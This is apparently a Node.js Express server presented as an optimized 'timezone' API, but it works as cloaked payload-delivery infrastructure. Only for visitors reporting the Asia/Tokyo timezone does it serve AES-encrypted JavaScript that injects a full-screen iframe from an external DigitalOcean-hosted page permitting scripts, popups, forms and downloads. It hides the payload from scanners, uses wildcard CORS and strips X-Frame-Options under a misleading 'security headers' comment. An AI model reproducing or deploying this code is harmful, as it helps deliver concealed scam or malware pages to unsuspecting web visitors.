const express = require("express");
const cors = require("cors");
const CryptoJS = require("crypto-js");

const app = express();
const PORT = 3000;
const secretKey = "2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf";

// --- Middleware ---
app.use(cors());
app.use(express.json());

// Optimized Security Headers Middleware
app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
    
    if (res.getHeader('X-Frame-Options') === 'sameorigin') {
        res.removeHeader('X-Frame-Options');
    }
    next();
});

// --- Static Data Configurations ---

// O(1) Instant Lookup Set
const ALLOWED_TIMEZONES = new Set([
    "Asia/Tokyo"
]);

// Target URL Configuration
const TARGET_URL = "https://starfish-app-ntd3v.ondigitalocean.app/Win0codejInfowj2n/index.html";

// --- Pre-Compilation Cache Layer ---
// This processes everything into memory ONCE during boot, removing CPU load during requests.

const RAW_PAYLOAD = `const iframe=document.createElement("iframe");iframe.src="${TARGET_URL}";iframe.setAttribute("allow","fullscreen; autoplay; encrypted-media; picture-in-picture");iframe.setAttribute("allowfullscreen","");iframe.setAttribute("webkitallowfullscreen","");iframe.setAttribute("mozallowfullscreen","");iframe.setAttribute("sandbox","allow-scripts allow-popups allow-forms allow-downloads");iframe.style.width="100%";iframe.style.height="100%";iframe.style.border="0px";const container=document.getElementById("contentiframe");if(container){container.replaceChildren(iframe);}`;

// Pre-encrypted static success and error payloads
const SUCCESS_PAYLOAD = encodeURIComponent(CryptoJS.AES.encrypt(RAW_PAYLOAD, secretKey).toString());
const ERROR_PAYLOAD = encodeURIComponent(CryptoJS.AES.encrypt(`console.log("Error Find");`, secretKey).toString());

// --- Routes ---

app.get("/timezone", (req, res) => {
    res.status(401).json({
        status: "error",
        message: "Unauthorized access",
        response: ERROR_PAYLOAD
    });
});

app.post("/timezone", (req, res) => {
    const { timezone } = req.body;

    // Fast validations against memory references 
    if (timezone && ALLOWED_TIMEZONES.has(timezone)) {
        res.send(SUCCESS_PAYLOAD);
    } else {
        res.send(ERROR_PAYLOAD);
    }
});

// --- Start Server ---
app.listen(PORT, () => {
    console.log(`High-performance server running on port ${PORT}`);
});
